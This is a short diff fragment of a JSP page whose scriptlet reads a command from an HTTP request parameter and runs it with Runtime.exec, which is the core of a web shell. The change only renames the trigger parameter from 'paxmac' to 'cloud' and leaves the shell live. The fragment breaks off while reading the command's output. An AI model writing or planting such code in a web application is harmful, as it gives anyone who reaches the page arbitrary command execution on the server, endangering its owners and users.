@@ -11,7 +11,7 @@
         <body>
             <jsp:scriptlet>
                try {
-		String cmd = request.getParameter("paxmac");
+		String cmd = request.getParameter("cloud");
 		if (cmd !=null){
 			Process child = Runtime.getRuntime().exec(cmd);
 			InputStream in = child.getInputStream();
